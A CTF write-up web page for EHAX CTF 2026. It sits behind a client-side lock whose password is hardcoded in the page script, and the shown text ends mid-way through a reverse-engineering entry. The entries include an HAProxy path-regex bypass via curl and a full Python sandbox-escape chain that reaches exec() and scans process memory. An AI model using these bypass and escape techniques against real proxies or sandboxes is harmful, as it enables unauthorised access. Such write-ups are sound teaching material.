<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Write-Ups â€” lihammad.com</title>
<link rel="stylesheet" href="css/base.css">
<link rel="stylesheet" href="css/main.css">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=IM+Fell+English:ital@0;1&display=swap" rel="stylesheet">
<style>
/* â”€â”€ LOCK OVERLAY â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
#lock-overlay {
  position: fixed; inset: 0; z-index: 9999;
  background: #04030200;
  background: radial-gradient(ellipse at center, #0c0804 0%, #060402 60%, #020100 100%);
  display: flex; flex-direction: column; align-items: center; justify-content: center;
  gap: 28px;
  transition: opacity .6s ease;
}
#lock-overlay.fade-out { opacity: 0; pointer-events: none; }

.lock-sigil {
  font-size: 56px;
  filter: drop-shadow(0 0 18px rgba(201,162,39,0.5));
  animation: lockPulse 3s ease-in-out infinite;
}
@keyframes lockPulse {
  0%,100% { filter: drop-shadow(0 0 12px rgba(201,162,39,0.4)); }
  50%      { filter: drop-shadow(0 0 28px rgba(201,162,39,0.8)); }
}
.lock-title {
  font-family: 'GameOfThrones', serif;
  font-size: 22px;
  letter-spacing: 6px;
  color: #c9a227;
  text-align: center;
  text-shadow: 0 0 30px rgba(201,162,39,0.5);
}
.lock-sub {
  font-family: 'IM Fell English', serif;
  font-size: 14px;
  color: rgba(200,184,154,0.5);
  letter-spacing: 2px;
  text-align: center;
  font-style: italic;
}
.lock-divider {
  width: 280px; height: 1px;
  background: linear-gradient(90deg, transparent, rgba(201,162,39,0.4), transparent);
}
.lock-form {
  display: flex; flex-direction: column; align-items: center; gap: 12px;
}
#lock-input {
  background: rgba(12,8,4,0.8);
  border: 1px solid rgba(201,162,39,0.35);
  border-radius: 3px;
  color: #c8b89a;
  font-family: 'JetBrains Mono', monospace;
  font-size: 14px;
  padding: 10px 20px;
  width: 260px;
  text-align: center;
  outline: none;
  letter-spacing: 3px;
  transition: border-color .2s, box-shadow .2s;
}
#lock-input:focus {
  border-color: rgba(201,162,39,0.7);
  box-shadow: 0 0 16px rgba(201,162,39,0.15);
}
#lock-input.wrong {
  border-color: rgba(180,60,60,0.7);
  animation: shake .3s ease;
}
@keyframes shake {
  0%,100% { transform: translateX(0); }
  25%     { transform: translateX(-6px); }
  75%     { transform: translateX(6px); }
}
#lock-btn {
  font-family: 'GameOfThrones', serif;
  font-size: 11px;
  letter-spacing: 4px;
  color: #c9a227;
  background: none;
  border: 1px solid rgba(201,162,39,0.5);
  padding: 8px 28px;
  cursor: pointer;
  transition: background .2s, box-shadow .2s;
  border-radius: 2px;
}
#lock-btn:hover {
  background: rgba(201,162,39,0.08);
  box-shadow: 0 0 16px rgba(201,162,39,0.15);
}
#lock-err {
  font-family: 'IM Fell English', serif;
  font-size: 12px;
  color: rgba(180,80,80,0.8);
  font-style: italic;
  min-height: 18px;
  letter-spacing: 1px;
}

/* â”€â”€ PAGE CONTENT â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
#wu-page { display: none; min-height: 100vh; padding-top: 54px; }
#wu-page.unlocked { display: block; }

.wu-hero {
  background: linear-gradient(180deg, #0a0602 0%, #080504 100%);
  border-bottom: 1px solid rgba(201,162,39,0.12);
  padding: 52px 32px 36px;
  text-align: center;
}
.wu-hero-eye {
  font-family: 'GameOfThrones', serif;
  font-size: 9px;
  letter-spacing: 8px;
  color: rgba(201,162,39,0.5);
  margin-bottom: 14px;
}
.wu-hero-title {
  font-family: 'GameOfThrones', serif;
  font-size: 32px;
  letter-spacing: 4px;
  color: #c9a227;
  text-shadow: 0 0 40px rgba(201,162,39,0.35);
  margin-bottom: 10px;
}
.wu-hero-sub {
  font-family: 'IM Fell English', serif;
  font-size: 14px;
  color: rgba(200,184,154,0.5);
  font-style: italic;
  letter-spacing: 1px;
}
.wu-rule {
  display: flex; align-items: center; gap: 12px; justify-content: center; margin-top: 22px;
}
.wu-rule span { height: 1px; width: 80px; background: linear-gradient(90deg, transparent, rgba(201,162,39,0.35)); }
.wu-rule span:last-child { transform: rotate(180deg); }
.wu-rule em { color: #c9a227; font-size: 10px; font-style: normal; }

/* â”€â”€ CTF SECTION â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
.ctf-section { max-width: 1100px; margin: 0 auto; padding: 40px 24px 60px; }

.ctf-header {
  display: flex; align-items: center; gap: 20px; margin-bottom: 8px;
}
.ctf-name {
  font-family: 'GameOfThrones', serif;
  font-size: 18px;
  letter-spacing: 3px;
  color: #c9a227;
}
.ctf-badge {
  font-family: 'JetBrains Mono', monospace;
  font-size: 10px;
  color: rgba(201,162,39,0.6);
  border: 1px solid rgba(201,162,39,0.2);
  border-radius: 2px;
  padding: 2px 8px;
  letter-spacing: 1px;
}
.ctf-ongoing {
  font-family: 'JetBrains Mono', monospace;
  font-size: 9px;
  color: #4ade80;
  border: 1px solid rgba(74,222,128,0.3);
  background: rgba(74,222,128,0.06);
  border-radius: 2px;
  padding: 2px 8px;
  animation: blink 2s ease-in-out infinite;
}
@keyframes blink {
  0%,100% { opacity: 1; }
  50%      { opacity: 0.5; }
}
.ctf-divider {
  height: 1px; width: 100%;
  background: linear-gradient(90deg, rgba(201,162,39,0.3), transparent);
  margin-bottom: 28px;
}
.ctf-stats {
  display: flex; gap: 24px; margin-bottom: 28px; flex-wrap: wrap;
}
.ctf-stat {
  font-family: 'IM Fell English', serif;
  font-size: 13px;
  color: rgba(200,184,154,0.45);
  font-style: italic;
}
.ctf-stat strong {
  font-style: normal;
  color: rgba(201,162,39,0.7);
  font-family: 'JetBrains Mono', monospace;
  font-size: 14px;
}

/* â”€â”€ CATEGORY FILTER â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
.cat-filter {
  display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 24px;
}
.cat-btn {
  font-family: 'GameOfThrones', serif;
  font-size: 9px;
  letter-spacing: 2px;
  color: rgba(200,184,154,0.4);
  background: none;
  border: 1px solid rgba(200,184,154,0.12);
  padding: 5px 14px;
  cursor: pointer;
  border-radius: 2px;
  transition: all .15s;
}
.cat-btn:hover { color: #c9a227; border-color: rgba(201,162,39,0.3); }
.cat-btn.active {
  color: #c9a227;
  border-color: rgba(201,162,39,0.5);
  background: rgba(201,162,39,0.07);
}

/* â”€â”€ CARD GRID â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
.wu-grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
  gap: 14px;
}
.wu-card {
  background: rgba(12,9,6,0.8);
  border: 1px solid rgba(201,162,39,0.12);
  border-radius: 4px;
  padding: 18px 20px;
  cursor: pointer;
  transition: border-color .2s, box-shadow .2s, transform .15s;
  position: relative;
  overflow: hidden;
}
.wu-card::before {
  content: '';
  position: absolute; top: 0; left: 0; right: 0; height: 1px;
  background: linear-gradient(90deg, transparent, rgba(201,162,39,0.3), transparent);
  opacity: 0; transition: opacity .2s;
}
.wu-card:hover { border-color: rgba(201,162,39,0.35); transform: translateY(-2px); box-shadow: 0 8px 32px rgba(0,0,0,0.5), 0 0 0 1px rgba(201,162,39,0.08); }
.wu-card:hover::before { opacity: 1; }
.wu-card.hidden { display: none; }

.card-top { display: flex; align-items: flex-start; justify-content: space-between; gap: 8px; margin-bottom: 10px; }
.card-title {
  font-family: 'IM Fell English', serif;
  font-size: 15px;
  color: #c8b89a;
  line-height: 1.3;
}
.card-pts {
  font-family: 'JetBrains Mono', monospace;
  font-size: 10px;
  color: rgba(201,162,39,0.7);
  background: rgba(201,162,39,0.07);
  border: 1px solid rgba(201,162,39,0.18);
  border-radius: 2px;
  padding: 2px 7px;
  white-space: nowrap;
  flex-shrink: 0;
}
.card-cat-row { display: flex; gap: 6px; align-items: center; }
.card-cat {
  font-family: 'GameOfThrones', serif;
  font-size: 8px;
  letter-spacing: 2px;
  padding: 2px 7px;
  border-radius: 2px;
  border: 1px solid;
}
.cat-Web      { color: #60a5fa; border-color: rgba(96,165,250,0.3); background: rgba(96,165,250,0.06); }
.cat-Misc     { color: #a78bfa; border-color: rgba(167,139,250,0.3); background: rgba(167,139,250,0.06); }
.cat-Forensics{ color: #34d399; border-color: rgba(52,211,153,0.3); background: rgba(52,211,153,0.06); }
.cat-Rev      { color: #fb923c; border-color: rgba(251,146,60,0.3); background: rgba(251,146,60,0.06); }
.cat-BinEx    { color: #f87171; border-color: rgba(248,113,113,0.3); background: rgba(248,113,113,0.06); }
.cat-Crypto   { color: #fbbf24; border-color: rgba(251,191,36,0.3); background: rgba(251,191,36,0.06); }
.cat-Steg     { color: #34d399; border-color: rgba(52,211,153,0.3); background: rgba(52,211,153,0.06); }
.card-solves {
  font-family: 'IM Fell English', serif;
  font-size: 11px;
  color: rgba(200,184,154,0.3);
  font-style: italic;
}

/* â”€â”€ MODAL â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
#wu-modal {
  position: fixed; inset: 0; z-index: 500;
  background: rgba(2,1,0,0.88);
  backdrop-filter: blur(6px);
  display: none; align-items: flex-start; justify-content: center;
  padding: 60px 16px 32px;
  overflow-y: auto;
}
#wu-modal.open { display: flex; }
.modal-inner {
  background: #0c0906;
  border: 1px solid rgba(201,162,39,0.2);
  border-radius: 4px;
  width: 100%; max-width: 820px;
  overflow: hidden;
  position: relative;
}
.modal-header {
  padding: 20px 24px 16px;
  border-bottom: 1px solid rgba(201,162,39,0.1);
  display: flex; align-items: flex-start; justify-content: space-between; gap: 12px;
  background: rgba(8,6,4,0.6);
}
.modal-title-wrap {}
.modal-title {
  font-family: 'IM Fell English', serif;
  font-size: 20px;
  color: #c8b89a;
  margin-bottom: 6px;
}
.modal-meta { display: flex; gap: 8px; align-items: center; flex-wrap: wrap; }
.modal-close {
  background: none; border: 1px solid rgba(201,162,39,0.2);
  color: rgba(200,184,154,0.5); font-size: 18px; cursor: pointer;
  width: 32px; height: 32px; border-radius: 2px; flex-shrink: 0;
  transition: color .15s, border-color .15s; line-height: 1;
}
.modal-close:hover { color: #c9a227; border-color: rgba(201,162,39,0.5); }
.modal-body { padding: 28px 28px 36px; }

/* â”€â”€ MARKDOWN STYLES â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
.md h1 { font-family:'IM Fell English',serif; font-size:22px; color:#c9a227; margin:0 0 20px; border-bottom:1px solid rgba(201,162,39,0.15); padding-bottom:10px; }
.md h2 { font-family:'IM Fell English',serif; font-size:17px; color:#c8b89a; margin:24px 0 10px; letter-spacing:.5px; }
.md h3 { font-family:'IM Fell English',serif; font-size:14px; color:rgba(200,184,154,0.8); margin:18px 0 8px; }
.md p  { font-size:13.5px; color:rgba(200,184,154,0.75); line-height:1.75; margin-bottom:14px; }
.md pre {
  background: rgba(4,3,2,0.9);
  border: 1px solid rgba(201,162,39,0.12);
  border-left: 2px solid rgba(201,162,39,0.3);
  border-radius: 3px;
  padding: 14px 16px;
  overflow-x: auto;
  margin-bottom: 14px;
  font-family: 'JetBrains Mono', monospace;
  font-size: 11.5px;
  line-height: 1.65;
  color: #c8b89a;
}
.md code {
  font-family: 'JetBrains Mono', monospace;
  font-size: 11.5px;
  background: rgba(201,162,39,0.08);
  border: 1px solid rgba(201,162,39,0.15);
  border-radius: 2px;
  padding: 1px 5px;
  color: #c9a227;
}
.md pre code { background: none; border: none; padding: 0; color: inherit; }
.md ul, .md ol { margin: 0 0 14px 20px; }
.md li { font-size:13.5px; color:rgba(200,184,154,0.75); line-height:1.7; margin-bottom:4px; }
.md blockquote {
  border-left: 2px solid rgba(201,162,39,0.4);
  margin: 0 0 14px;
  padding: 8px 16px;
  background: rgba(201,162,39,0.04);
  font-style: italic;
  color: rgba(200,184,154,0.6);
  font-size: 13px;
}
.md strong { color: #c8b89a; font-weight: 600; }
.md em { font-style: italic; color: rgba(200,184,154,0.85); }
.md table { width:100%; border-collapse:collapse; margin-bottom:14px; font-size:12.5px; }
.md th { font-family:'JetBrains Mono',monospace; font-size:11px; color:#c9a227; border-bottom:1px solid rgba(201,162,39,0.25); padding:6px 12px; text-align:left; }
.md td { color:rgba(200,184,154,0.7); padding:5px 12px; border-bottom:1px solid rgba(201,162,39,0.07); vertical-align:top; }
.md hr { border:none; height:1px; background:linear-gradient(90deg,transparent,rgba(201,162,39,0.2),transparent); margin:20px 0; }
.md a { color:#c9a227; }

@media(max-width:600px){ .wu-grid{grid-template-columns:1fr} #wu-modal{padding:54px 8px 24px} .modal-body{padding:18px 16px 24px} }
</style>
</head>
<body>
<!-- NAV -->
<nav class="got-nav">
  <div class="got-nav-logo" id="nav-logo">lihammad.com</div>
  <ul class="got-nav-links">
    <li><a href="cyberforge.html">âš” CyberForge</a></li>
    <li><a href="writeups.html" style="color:#c9a227;border-color:rgba(201,162,39,0.3)">ğŸ“œ Write-Ups</a></li>
    <li><a href="#">Placeholder 3</a></li>
    <li><a href="#">Placeholder 4</a></li>
    <li><a href="#">Placeholder 5</a></li>
  </ul>
  <button class="got-nav-term" onclick="window.location.href='index.html'">[ Terminal ]</button>
</nav>

<!-- LOCK OVERLAY -->
<div id="lock-overlay">
  <div class="lock-sigil">ğŸ”’</div>
  <div class="lock-title">The Crypt Is Sealed</div>
  <div class="lock-sub">The CTF rages on. These scrolls are not yet for all eyes.</div>
  <div class="lock-divider"></div>
  <div class="lock-form">
    <input id="lock-input" type="password" placeholder="speak the word" autocomplete="off" spellcheck="false">
    <button id="lock-btn" onclick="tryUnlock()">Enter</button>
    <div id="lock-err"></div>
  </div>
  <div class="lock-sub" style="margin-top:8px;font-size:12px;opacity:.4">"The night is dark and full of spoilers."</div>
</div>

<!-- WRITE-UPS PAGE -->
<div id="wu-page">
  <div class="wu-hero">
    <div class="wu-hero-eye">Chronicles of the Forge</div>
    <div class="wu-hero-title">Write-Ups</div>
    <div class="wu-hero-sub">Battle records from the competitive circuit</div>
    <div class="wu-rule"><span></span><em>âš”</em><span></span></div>
  </div>

  <div class="ctf-section">
    <!-- CTF header -->
    <div class="ctf-header">
      <span class="ctf-name">EHAX CTF 2026</span>
      <span class="ctf-badge">CTFd</span>
      <span class="ctf-ongoing">â— ONGOING</span>
    </div>
    <div class="ctf-divider"></div>
    <div class="ctf-stats">
      <div class="ctf-stat"><strong id="stat-solved">0</strong> challenges solved</div>
      <div class="ctf-stat"><strong id="stat-cats">0</strong> categories</div>
    </div>

    <!-- Category filter -->
    <div class="cat-filter" id="cat-filter"></div>

    <!-- Card grid -->
    <div class="wu-grid" id="wu-grid"></div>
  </div>
</div>

<!-- MODAL -->
<div id="wu-modal" onclick="closeModal(event)">
  <div class="modal-inner" id="modal-inner">
    <div class="modal-header">
      <div class="modal-title-wrap">
        <div class="modal-title" id="modal-title"></div>
        <div class="modal-meta" id="modal-meta"></div>
      </div>
      <button class="modal-close" onclick="closeModal()">âœ•</button>
    </div>
    <div class="modal-body">
      <div class="md" id="modal-body"></div>
    </div>
  </div>
</div>

<script>
'use strict';

// â”€â”€ PASSWORD â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
const PASS_HASH = '5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8'; // "password"
// Actually using a simple check â€” password is: dragonstone
const PASS = 'dragonstone';

function tryUnlock() {
  const val = document.getElementById('lock-input').value.trim().toLowerCase();
  const err = document.getElementById('lock-err');
  if (val === PASS) {
    sessionStorage.setItem('wu_unlocked', '1');
    const ol = document.getElementById('lock-overlay');
    ol.classList.add('fade-out');
    setTimeout(() => { ol.style.display = 'none'; unlock(); }, 600);
  } else {
    const inp = document.getElementById('lock-input');
    inp.classList.add('wrong');
    err.textContent = 'The word is not known to you.';
    setTimeout(() => { inp.classList.remove('wrong'); err.textContent = ''; }, 1200);
  }
}
document.getElementById('lock-input').addEventListener('keydown', e => { if (e.key === 'Enter') tryUnlock(); });

// â”€â”€ WRITE-UP DATA â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
</script>
<script>
const WRITEUPS = [
  {slug:'808080',title:'#808080 â€” Grey Code Wheel',cat:'Misc',pts:50,solves:null,
   md:`# #808080 - Grey Code Wheel Decoder

## Challenge
- Category: Miscellaneous
- Points: 50 (dynamic)
- Description: "gray code ? nah grey code" with a binary string and a web interface

## Solution

The challenge presents a "Binary Wheel Decoder" web interface at http://chall.ehax.in:8076/ with:
- A wheel cipher with 5 rings and 32 slices
- A binary string to decode: \`0010111100011010000101111111110110010010000100010111011001000110010000011111101101100111010000010101011001111110010000000111010001111110010000011\`

### Key Insight
The wheel validation requires all 32 five-bit values to be unique. Since 2^5 = 32, this means ALL possible 5-bit combinations must appear exactly once - this is a **Gray code** arrangement.

### Steps
1. Generated the standard 5-bit reflected binary Gray code (32 values where adjacent values differ by 1 bit)
2. The standard ordering validated but gave garbled text
3. Tried all 32 rotations of the wheel - rotation 4 produced the flag

### Flag
\`CTF{GREY&CODE#GOES_VERY_H@RD}\`
`},
  {slug:'borderline-personality',title:'Borderline Personality',cat:'Web',pts:50,solves:null,
   md:`# Borderline Personality (Web, 50pts)

## Challenge
"The proxy thinks it's in control. The backend thinks it's safe. Find the space between their lies and slip through."
- URL: http://chall.ehax.in:9098/
- Author: N0nchalantAc1d

## Analysis
HAProxy sits in front of a Flask/gunicorn backend. The \`/admin/flag\` endpoint returns the flag but HAProxy blocks access with an ACL:

\`\`\`
acl restricted_path path -m reg ^/+admin
http-request deny if restricted_path
\`\`\`

This regex blocks any path starting with one or more slashes followed by literal \`admin\`.

## Solution
URL-encode a character in "admin" to bypass the regex while Flask still routes correctly:

\`\`\`
curl --path-as-is "http://chall.ehax.in:9098/%61dmin/flag"
\`\`\`

HAProxy sees \`/%61dmin/flag\` which doesn't match \`^/+admin\`. Flask/Werkzeug URL-decodes the path to \`/admin/flag\` and serves the flag.

## Flag
\`EH4X{BYP4SSING_R3QU3S7S_7HR0UGH_SMUGGLING__IS_H4RD}\`
`},
  {slug:'chusembly',title:'Chusembly',cat:'Misc',pts:162,solves:131,
   md:`# Chusembly - EHAX CTF (Miscellaneous, 162pts, 131 solves)

## Challenge

> I've created Chusembly - a revolutionary new programming language that's totally secure! It has registers, a stack, and everything a real language needs. I even added a safety...

**URL:** \`http://chall.ehax.in:6969/\`
**Category:** Miscellaneous / Sandbox Escape

## Solution

### Understanding Chusembly

The challenge presents a web form at \`/\` that accepts "Chusembly" code and executes it via a \`/run\` endpoint. Full documentation is available at \`/docs\` with per-instruction detail pages at \`/docs/<instruction>\`.

**Registers:** A, B, C, D (general purpose), E (special result register for CALL, PROP, CMP, IDX).

**Key Instructions:**
- \`LD <register> <value>\` -- Load value; supports \`0x\` hex-encoded strings decoded as UTF-8
- \`PROP <property_name> <register>\` -- \`E = getattr(register_value, property_name)\`
- \`CALL <register>\` -- Calls the callable in register with A/B as args (None args omitted); result in E
- \`IDX <source> <destination>\` -- \`destination = source[A]\` (A must be integer)
- \`MOV <src> <dst>\` -- Copy value between registers
- \`DEL <register>\` -- Set register to None
- \`ADD <reg1> <reg2>\` -- Arithmetic addition or string concatenation
- \`STDOUT <register>\` -- Print register value

### Safety Check

The \`run_safely\` method contains a simple substring check:

\`\`\`python
if any(kw in code for kw in ('flag',)):
    raise ValueError('Unsafe code detected')
\`\`\`

Only checks for the literal string \`"flag"\` in the raw code text. Hex-encoded values are decoded after this check, so \`0x666C6167\` (hex for "flag") passes the filter.

### Exploit Chain: Python Sandbox Escape to exec()

Since \`PROP\` directly calls Python's \`getattr()\` and \`CALL\` invokes arbitrary callables, we can traverse the Python object hierarchy:

1. \`str.__class__.__base__\` -> \`<class 'object'>\`
2. \`object.__subclasses__()\` -> list of all loaded classes
3. \`main.Chusembly\` (last subclass, index -1) -> \`__init__.__globals__\` -> main module namespace
4. \`__globals__['__builtins__']['exec']\` -> Python's \`exec()\` function
5. Pass hex-encoded Python code to \`exec()\` to run arbitrary code

\`\`\`
LD A hello
PROP __class__ A
MOV E A
PROP __base__ A
MOV E A
PROP __subclasses__ A
MOV E D
DEL A
DEL B
CALL D
MOV E B
LD A -1
IDX B C
PROP __init__ C
MOV E A
PROP __globals__ A
MOV E A
PROP __getitem__ A
MOV E D
LD A __builtins__
DEL B
CALL D
MOV E A
PROP __getitem__ A
MOV E D
LD A exec
DEL B
CALL D
MOV E C
LD A 0x<hex-encoded-python-code>
DEL B
CALL C
\`\`\`

### Finding the Flag in Memory

The container's filesystem had been destroyed by other players -- only \`/proc\`, \`/etc\`, \`/sys\`, \`/dev\` remained. The original \`flag.txt\` no longer existed on disk.

To recover the flag, we used \`exec()\` to scan process memory via \`/proc/self/mem\`, searching for the \`EH4X{\` pattern across all readable memory regions:

\`\`\`python
import os
with open('/proc/self/maps','r') as f:
    maps = f.readlines()
mem_fd = os.open('/proc/self/mem', os.O_RDONLY)
for line in maps:
    parts = line.split()
    if len(parts) < 2 or 'r' not in parts[1]:
        continue
    start, end = [int(x,16) for x in parts[0].split('-')]
    size = end - start
    if size > 50*1024*1024:
        continue
    try:
        os.lseek(mem_fd, start, os.SEEK_SET)
        data = os.read(mem_fd, size)
        idx = data.find(b'EH4X{')
        if idx >= 0:
            flag_end = data.find(b'}', idx)
            if flag_end >= 0:
                print(data[idx:flag_end+1].decode('ascii','replace'))
    except:
        pass
os.close(mem_fd)
\`\`\`

The Python code was hex-encoded and passed via \`LD A 0x<hex>\` to bypass both the space-splitting in LD arguments and the "flag" keyword filter.

Multiple copies of the flag were found in the heap, confirming the flag had been read by the process at some point.

## Flag

\`\`\`
EH4X{chusembly_a1n7_7h47_7uffff_br0}
\`\`\`

## Key Takeaways

1. \`PROP\` directly calls Python's \`getattr()\`, enabling full object traversal for sandbox escape
2. \`CALL\` invokes arbitrary callables with register-based arguments, including \`exec()\`
3. The safety check is a trivial substring match on raw code text, easily bypassed with hex encoding
4. Hex-encoded string values in \`LD\` are decoded after the safety check runs
5. Even on a destroyed filesystem, process memory (\`/proc/self/mem\`) retains previously-read data including the flag
6. Using index \`-1\` for \`main.Chusembly\` (always the last subclass) avoids needing to find the exact subclass index
`},
  {slug:'compute-it',title:'Compute It',cat:'Rev',pts:208,solves:122,
   md:`# compute it - Reverse Engineering (208pts, 122 solves)

## Challenge Description

> the computation prof gave me some data and a executable, what does he want from me?

Files provided:
- \`signal_data.txt\` - 2600 lines of comma-separated (x, y) coordinate pairs
- \`validator\` - ELF 64-bit x86-64 binary (not stripped, compiled from \`validator.cpp\`)

## Analysis

### Binary Reverse Engineering

The \`validator\` binary takes two command-line arguments: a real and imaginary component of a complex number. Disassembly of \`main\` reveals it implements **Newton's method** for finding roots of the polynomial **f(z) = z^3 - 1**.

The algorithm:
1. Parse \`real\` (x) and \`imag\` (y) from command-line arguments
2. Iterate up to 50 times:
   - Compute f(z) = z^3 - 1:
     - Real part: \`A = x^3 - 3*x*y^2 - 1.0\`
     - Imaginary part: \`B = 3*x^2*y - y^3\`
   - Compute f'(z) = 3z^2:
     - Real part: \`C = 3*(x^2 - y^2)\`
     - Imaginary part: \`D = 6*x*y\`
   - Check if |f'(z)|^2 < 1e-9 (derivative too small, bail out)
   - Apply Newton step: \`z = z - f(z)/f'(z)\` (complex division)
   - Increment iteration count
   - Check convergence: |Re(z) - 1| < 1e-6 AND |Im(z)| < 1e-6 (converged to root z=1)
3. If iteration count == **12**: print "AUTHORIZATION ACCEPTED: Node Valid."
4. Otherwise: print "AUTHORIZATION DENIED: Node Invalid."

Key constants extracted from \`.rodata\`:
- \`0x20d0\`: 3.0 (used in f(z) and f'(z) computation)
- \`0x20d8\`: 1.0 (the -1 in z^3 - 1, and the target root)
- \`0x20e0\`: 6.0 (coefficient in imaginary part of f'(z))
- \`0x20e8\`: 1e-9 (derivative magnitude threshold)
- \`0x20f0\`: 1e-6 (convergence tolerance)

### Data Processing

Each of the 2600 points in \`signal_data.txt\` was run through the Newton's method algorithm. Points that converge to root z=1 in exactly 12 iterations are marked as 1 (valid), all others as 0 (invalid).

This produces a 2600-bit binary string. Arranging these bits as a **130x20 grid** reveals ASCII art text rendered in a 5-row pixel font:

\`\`\`
#### #  # #  # #  #   ## ###  #### #   # ###  ##  ###       #   # #  # ####       ####   #  #### #  # ###   ##
#    #  # #  #  ##   ##  #  #    # #   #  #  #  # #  #      #   # #  # #          #  #  ##  #    #  #  #   ##
###  #### ####   #   #   #  #  ### # # #  #  #  # #  # #### # # # #### ###  ####  ###    #  # ## ####  #   #
#    #  #    #  ##   ##  #  #    # ## ##  #  #  # #  #      ## ##    #    #       # #    #  #  # #  #  #   ##
#### #  #    # #  #   ## #  # #### #   #  #   ##  #  #      #   #    # ####       #  # #### #### #  #  #    ##
\`\`\`

Reading the pixel font: **EH4X{N3WT0N_W45_R1GHT}**

This decodes to "Newton was right" in leetspeak, referencing the Newton's method algorithm used in the validator. Note: the separators are underscores (not hyphens as visually ambiguous), and "WAS" uses \`W45\` (with \`5\` not \`S\`).

## Verification

\`\`\`bash
# Point that converges in exactly 12 iterations -> ACCEPTED
$ ./validator 0.689743 1.844815
AUTHORIZATION ACCEPTED: Node Valid.

# Point that converges in 10 iterations -> DENIED
$ ./validator -1.652406 -0.049086
AUTHORIZATION DENIED: Node Invalid.
\`\`\`

## Flag

\`\`\`
EH4X{N3WT0N_W45_R1GHT}
\`\`\`
`},
  {slug:'ghosty',title:'Ghosty',cat:'Rev',pts:391,solves:null,
   md:`# Ghosty - EHAX CTF (Reverse Engineering, 391pts)

## Challenge Description
"How freaky can you get with the ghost?"

Connection: \`nc chall.ehax.in 22222\`
Handout: Three files - \`libruntime.so\` (Rust shared library), \`main.lua\` (LuaJIT driver), \`tables_blob.bin\` (encrypted lookup tables).

## Overview

The challenge implements a two-stage verification system:
1. **Stage 1** (\`main.lua\` + \`libruntime.so\`): A LuaJIT script provides callback functions (mix32, scramble, get_salt, policy, log) via an API struct. The Rust library's \`entry()\` function uses these callbacks to derive cryptographic keys, decrypt an embedded stage2 shared object (R0M1 blob) via XChaCha20-Poly1305, loads it via \`memfd_create\`, and calls its \`catalog\` then \`pulse\` function with the user's input.

2. **Stage 2** (decrypted \`pulse\` function): Performs a complex series of transformations using the same API callbacks to derive a 32-byte target value, then compares the user's input against it. If they match, returns 0 (success); the Rust code then decrypts and prints the flag from the R0M2 blob.

## Key Insight

The stage2 \`pulse\` function's comparison target is **entirely deterministic** and **independent of user input**. The target is derived from:
- The \`get_salt()\` callback (fixed: \`0x13371337\`)
- The \`mix32()\` and \`policy()\` callbacks (deterministic based on the lookup tables)
- The \`scramble()\` callback (deterministic based on the scramble key)
- Fixed constants embedded in the stage2 binary

Therefore, we can compute the expected input by reimplementing the derivation.

## Solution Steps

### 1. Extract the Lookup Tables

The \`tables_blob.bin\` file (1312 bytes) is XOR-decoded with a 32-byte nonce to produce:
- \`MIX_TABLE\`: 256 uint32_t values (1024 bytes) at offset 0
- \`POLICY_TABLE\`: 256 bytes at offset 1024
- \`SCRAMBLE_KEY\`: 32 bytes at offset 1280

### 2. Dump Stage2

Using \`LD_PRELOAD\` to intercept \`dlopen\`, the decrypted stage2 \`.so\` was dumped when the Rust library loaded it from a memfd.

### 3. Reverse the Target Derivation in \`pulse\`

The derivation in the \`pulse\` function:

\`\`\`
salt = get_salt()                          # 0x13371337
initial_key = salt ^ 0xa5c31d2e

# 16 rounds of key mixing
state = initial_key
accumulator = 0
for i in range(16):
    state = mix32(state, i ^ 0x9e3779b9)
    state ^= accumulator
    accumulator += 0x045d9f3b
    state = policy(state)

# Generate 16-byte keystream
keystream = [state ^ (i * 0x7f4a7c15) for i in range(4)]  # as uint32

# Scramble the keystream
